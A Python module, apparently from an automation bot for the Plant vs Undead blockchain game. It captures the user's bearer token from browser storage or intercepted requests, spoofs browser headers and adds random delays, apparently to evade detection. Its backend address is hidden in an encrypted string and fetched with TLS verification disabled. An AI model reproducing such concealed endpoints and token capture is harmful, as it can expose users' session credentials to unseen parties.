# -*- coding: utf-8 -*-
from decenc.decstr import strdec
import os
import random
import time
from datetime import datetime
from browser import get_browser
from local_storage import LocalStorage
from logs import log
import requests
import urllib3

BEARER = None
BACKEND_URL = None


def get_headers():
    random_sleep()

    headers = {
        "authority": "backend-farm-stg.plantvsundead.com",
        "accept": "application/json, text/plain, */*",
        "authorization": f"{get_bearer_token()}",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
        "origin": "https://marketplace.plantvsundead.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://marketplace.plantvsundead.com/",
        "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    }

    return headers


def reset_backend_url():
    global BACKEND_URL
    BACKEND_URL = None


def get_backend_url():
    global BACKEND_URL

    if BACKEND_URL is None:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        a = "jbHx_8nEkYIOQWt6siS7CQABhqCAAAAAAGEyEvQCvMuu_6VnRzSi9JGA7NT6fs0P9VZKAZEzkDx9wSZsnGap8DmlOJvPPoCbxCbIIk69wk2UuES4t899y-Y5MHfbhDy7GkP9yB9ljWJyPnqbVVkTbVXJYJyo0oUGupnDB5o="
        b = a.encode()
        c = strdec(a, "be").decode()

        response = requests.get(c, verify=False)

        url = response.text

        BACKEND_URL = url

    return BACKEND_URL


def get_bearer_token():
    global BEARER

    if BEARER is None:
        log("Pegando novo Token")
    else:
        random_sleep()
        return BEARER

    try:
        driver = get_browser()
        storage = LocalStorage(driver)
        token = storage.get("token")

        if token is not None:
            BEARER = token
        else:
            raise Exception
    except:

        try:
            driver = get_browser()

            random_sleep()
            if driver is not None:
                driver.get(
                    "https://marketplace.plantvsundead.com/farm#/profile/inventory"
                )

        except:
            log("Impossível ir para a página de inventário")

        waiting_req = True

        while waiting_req:
            random_sleep()

            for req in driver.requests:
                if f"get-seeds-inventory" in req.url:
                    if "authorization" in req.headers:
                        BEARER = req.headers["authorization"]
                        waiting_req = False

        try:
            if driver is not None:
                random_sleep()
                driver.get("https://marketplace.plantvsundead.com/farm#/farm")
        except:
            log("Impossível voltar para a fazenda após pegar o token")
    finally:
        return BEARER


def random_sleep(multiplier=2, min_time=0, max_time=None, verbose=False):
    if os.getenv("RANDOM_SLEEPS", "TRUE").lower() in ("false", "1"):
        return
    random_time = random.random() * multiplier

    if random_time < min_time:
        random_time = min_time + (random.random() * (min_time / 5))
        # Min time + [0...20%]

    if max_time is not None:
        if random_time > max_time:
            random_time = random.randint(min_time, max_time)
            if random_time >= max_time * 0.9:
                random_time -= random.random() * (max_time / 10)
                # Random - [0...10%]
            if random_time <= max_time / 2:
                random_time += random.random() * (max_time / 5)
                # Random + [0...20%]
            else:
                random_time += random.random() * (max_time / 10)
                # Random + [0...10%]

    if verbose:
        if random_time > 60:
            minutes = random_time // 60
            seconds = random_time % 60
            log(
                f"Esperando {minutes:.0f} minutos e {seconds:.2f} segundos para a próxima ação"
            )
        else:
            log(f"Esperando {random_time:.2f} segundos para a próxima ação")

    time.sleep(random_time)
